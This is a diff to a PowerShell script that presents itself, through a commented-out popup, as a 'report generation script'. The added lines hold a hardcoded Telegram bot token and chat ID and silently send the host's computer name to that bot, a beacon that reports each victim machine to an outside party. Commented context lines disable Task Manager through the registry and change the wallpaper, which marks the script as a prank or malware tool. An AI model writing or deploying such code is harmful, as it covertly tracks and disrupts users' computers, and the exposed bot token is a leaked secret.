@@ -1,4 +1,17 @@
 #3
+
+$ComputerName = $env:COMPUTERNAME
+$token = "8438311215:AAG4JFC3Lkqx2l6Cx3nQZmmnpU6Fn_sbHgE"
+$chatId = "5757392163"
+
+$msg = "A executar script em $ComputerName"
+    Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" `
+        -Method Post `
+        -ContentType "application/json" `
+        -Body (@{ chat_id = $chatId; text = $msg } | ConvertTo-Json)
+
+
+
 #$wshell = New-Object -ComObject Wscript.Shell
 #$wshell.Popup("The report generation script is executed!d")
 #reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
@@ -75,6 +88,7 @@ public class Params
 #Set-WallPaper -Image "$env:TMP\i.png" -Style Center
 
 exit
+
 
 
 
